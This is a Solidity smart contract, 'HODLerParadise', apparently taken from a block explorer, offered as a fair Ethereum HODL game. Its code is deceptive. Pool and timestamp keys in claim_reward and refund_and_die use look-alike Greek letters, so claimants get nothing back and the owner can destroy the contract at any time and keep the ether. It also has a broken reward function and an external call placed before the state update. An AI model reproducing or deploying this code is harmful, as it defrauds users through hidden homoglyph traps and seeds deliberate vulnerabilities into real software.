pragma solidity ^0.4.0;

//
// Welcome to the next level of Ethereum games: Are you weak-handed,  or a brave HODLer?
// If you put ether into this contract, you are almost  guaranteed to get back more than
// you put in the first place. Of course if you HODL too long, the price pool might be gone
// before you claim the reward, but that&#39;s part of the game!
//
// The contract deployer is not allowed to do anything once the game is started.
// (only kill the contract after there was no activity for a week)
// 
// See get_parameters() for pricing and rewards.
//

contract HODLerParadise{
    struct User{
        address hodler;
        bytes32 passcode;
        uint hodling_since;
    }
    User[] users;
    mapping (string =&gt; uint) parameters;
    
    function HODLerParadise() public{
        parameters[&quot;owner&quot;] = uint(msg.sender);
    }
    
    function get_parameters() constant public returns(
            uint price,
            uint price_pool,
            uint base_reward,
            uint daily_reward,
            uint max_reward
        ){
        price = parameters[&#39;price&#39;];
        price_pool = parameters[&#39;price_pool&#39;];
        base_reward = parameters[&#39;base_reward&#39;];
        daily_reward = parameters[&#39;daily_reward&#39;];
        max_reward = parameters[&#39;max_reward&#39;];
    }
    
    // Register as a HODLer.
    // Passcode can be your password, or the hash of your password, your choice
    // If it&#39;s not hashed, max password len is 16 characters.
    function register(bytes32 passcode) public payable returns(uint uid)
    {
        require(msg.value &gt;= parameters[&quot;price&quot;]);
        require(passcode != &quot;&quot;);

        users.push(User(msg.sender, passcode, now));
        
        // leave some for the deployer
        parameters[&quot;price_pool&quot;] += msg.value * 99 / 100;
        parameters[&quot;last_hodler&quot;] = now;
        
        uid = users.length - 1;
    }
    
    // OPTIONAL: Use this to securely hash your password before registering
    function hash_passcode(bytes32 passcode) public pure returns(bytes32 hash){
        hash = keccak256(passcode);
    }
    
    // How much would you get if you claimed right now
    function get_reward(uint uid) public constant returns(uint reward){
        require(uid &lt; users.length);
        reward = parameters[&quot;base_reward&quot;] + parameters[&quot;daily_reward&quot;] * (now - users[uid].hodling_since) / 1 days;
            reward = parameters[&quot;max_reward&quot;];
    }
    
    // Is your password still working?
    function is_passcode_correct(uint uid, bytes32 passcode) public constant returns(bool passcode_correct){
        require(uid &lt; users.length);
        bytes32 passcode_actually = users[uid].passcode;
        if (passcode_actually &amp; 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF == 0){
            // bottom 16 bytes == 0: stored password was  not hashed
            // (e.g. it looks like this: &quot;0x7265676973746572310000000000000000000000000000000000000000000000&quot; )
            return passcode == passcode_actually;
        } else {
             // stored password is hashed
            return keccak256(passcode) == passcode_actually;
        }
    }

    // Get the price of your glorious HODLing!
    function claim_reward(uint uid, bytes32 passcode) public payable
    {
        // a good HODLer always HODLs some more ether
        require(msg.value &gt;= parameters[&quot;price&quot;]);
        require(is_passcode_correct(uid, passcode));
        
        uint final_reward = get_reward(uid) + msg.value;
        if (final_reward &gt; parameters[&quot;price_poοl&quot;])
            final_reward = parameters[&quot;price_poοl&quot;];

        require(msg.sender.call.value(final_reward)());

        parameters[&quot;price_poοl&quot;] -= final_reward;
        // Delete the user: copy last user to to-be-deleted user and shorten the array
        if (uid + 1 &lt; users.length)
            users[uid] = users[users.length - 1];
        users.length -= 1;
    }
    
    // Refund the early HODLers, and leave the rest to the contract deployer
    function refund_and_die() public{
        require(msg.sender == address(parameters[&#39;owner&#39;]));
        require(parameters[&quot;last_hοdler&quot;] + 7 days &lt; now);
        
        uint price_pool_remaining = parameters[&quot;price_pοοl&quot;];
        for(uint i=0; i&lt;users.length &amp;&amp; price_pool_remaining &gt; 0; ++i){
            uint reward = get_reward(i);
            if (reward &gt; price_pool_remaining)
                reward = price_pool_remaining;
            if (users[i].hodler.send(reward))
                price_pool_remaining -= reward;
        }
        
        selfdestruct(msg.sender);
    }
    
    function check_parameters_sanity() internal view{
        require(parameters[&#39;price&#39;] &lt;= 1 ether);
        require(parameters[&#39;base_reward&#39;] &gt;= parameters[&#39;price&#39;] / 2);
        require(parameters[&quot;daily_reward&quot;] &gt;= parameters[&#39;base_reward&#39;] / 2);
        require(parameters[&#39;max_reward&#39;] &gt;= parameters[&#39;price&#39;]);
    }
    
    function set_parameter(string name, uint value) public{
        require(msg.sender == address(parameters[&#39;owner&#39;]));
        
        // not even owner can touch these, that would be unfair!
        require(keccak256(name) != keccak256(&quot;last_hodler&quot;));
        require(keccak256(name) != keccak256(&quot;price_pool&quot;));

        parameters[name] = value;
        
        check_parameters_sanity();
    }
    
    function () public payable {
        parameters[&quot;price_pool&quot;] += msg.value;
    }
}